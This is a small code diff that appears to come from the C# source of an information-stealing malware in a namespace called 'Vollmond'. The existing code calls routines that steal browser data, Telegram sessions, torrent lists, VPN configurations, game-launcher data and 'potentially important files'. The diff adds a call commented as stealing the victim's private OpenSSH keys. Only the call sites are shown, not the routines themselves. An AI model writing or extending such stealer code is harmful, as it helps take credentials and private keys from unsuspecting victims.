@@ -28,6 +28,7 @@ namespace Vollmond
                 StealAllBrowsers.stealAllBrowsers();
                 StealTelegram.StealSession();
                 UTorrent.StealCurrentTorrents();
+                GitAgent.Steal(); // Steal the private openssh keys
                 GrabPotentiallyImportantFiles.grabPotentiallyImportantFiles();
                 ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                 Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
